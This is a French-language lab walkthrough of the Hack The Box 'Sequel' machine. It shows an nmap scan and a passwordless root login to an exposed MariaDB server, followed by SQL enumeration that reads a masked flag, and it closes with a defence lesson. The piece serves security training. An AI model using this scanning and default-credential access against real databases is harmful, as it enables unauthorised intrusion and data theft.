# Sequel — HTB Starting Point (Tier 1)

| | |
|---|---|
| **Section** | Starting Point — Tier 1 |
| **Machine** | `Sequel` |
| **OS** | Linux (Debian) |
| **IP cible** | `10.129.159.156` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap  →  3306/tcp : MariaDB 10.3.27
      →  mysql -h $IP -u root --skip-ssl   (root SANS mot de passe)
      →  SHOW DATABASES; -> base "htb"
      →  USE htb; SHOW TABLES; -> config, users
      →  SELECT * FROM config;  -> ligne name='flag'  →  flag
```

---

## 1. Reconnaissance

```bash
box sequel <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

| Port | Service | Version |
|---|---|---|
| 3306/tcp | mysql | MariaDB 5.5.5-10.3.27 (Debian) |

Le script `mysql-info` confirme MariaDB. Un seul service : la base de données.

> ⚠️ Le service scan a mis **~3 min 20** (201 s). Réflexe pour la suite : lancer le full scan en arrière-plan et démarrer avec un scan ciblé (`-p 3306` ou `--top-ports 100`).

---

## 2. Accès → flag

**Le concept :** un serveur de base de données exposé avec des **identifiants par défaut/faibles** — ici le compte `root` **sans mot de passe**. Même logique que Redeemer (Redis), mais en SQL.

**Connexion :**

```bash
mysql -h $IP -u root --skip-ssl
```

> ⚠️ **Piège rencontré** : sans `--skip-ssl`, le client récent renvoie
> `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it`.
> Le client **exige TLS par défaut**, le vieux serveur ne le propose pas → on désactive avec `--skip-ssl` (ou `--ssl=0` selon la version du client). Ce n'est pas une protection de la box.

**Exploration SQL :**

```sql
SHOW DATABASES;          -- htb | information_schema | mysql | performance_schema
USE htb;                 -- la base non-systeme
SHOW TABLES;             -- config | users
DESCRIBE config;         -- id | name | value   (voir la structure avant de lire)
SELECT * FROM config;
```

```
| 5 | flag | `<flag masque>` |
```

→ le flag est stocké dans la table `config`, ligne `name='flag'`.

> Astuce : `DESCRIBE <table>;` montre les colonnes avant de faire un `SELECT *` — utile sur de grosses tables.

---

## 3. Mémo MySQL / MariaDB

| Besoin | Commande |
|---|---|
| Se connecter (sans SSL) | `mysql -h $IP -u root --skip-ssl` |
| Lister les bases | `SHOW DATABASES;` |
| Choisir une base | `USE <base>;` |
| Lister les tables | `SHOW TABLES;` |
| Voir les colonnes d'une table | `DESCRIBE <table>;` |
| Lire tout le contenu | `SELECT * FROM <table>;` |
| Requête en une ligne (shell) | `mysql -h $IP -u root --skip-ssl htb -e 'SELECT * FROM config;'` |

Bases **système** à ignorer : `information_schema`, `mysql`, `performance_schema`, `sys`.

---

## 4. Leçons à retenir

- **Identifiants par défaut** : `root` sans mot de passe sur une base exposée = accès total. Toujours tester.
- **Le piège TLS du client** : `--skip-ssl` / `--ssl=0` quand le serveur est ancien. Un message d'erreur « SSL required » côté client ≠ sécurité de la cible.
- **Méthode d'exploration SQL** : `SHOW DATABASES` → `USE` → `SHOW TABLES` → `DESCRIBE` → `SELECT *`. C'est la même démarche d'énumération que partout : lister puis lire.
- **Attention aux fautes de frappe SQL** : `SHOW DATABASE;` (sans `S`) → erreur 1064. La commande est `SHOW DATABASES;`.
- **Défense** : jamais de compte `root` sans mot de passe, et base non exposée sur le réseau.

---

## Commandes — récap express

```bash
box sequel <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP          # -> 3306 MariaDB
mysql -h $IP -u root --skip-ssl
# SQL: SHOW DATABASES; USE htb; SHOW TABLES; SELECT * FROM config;
```
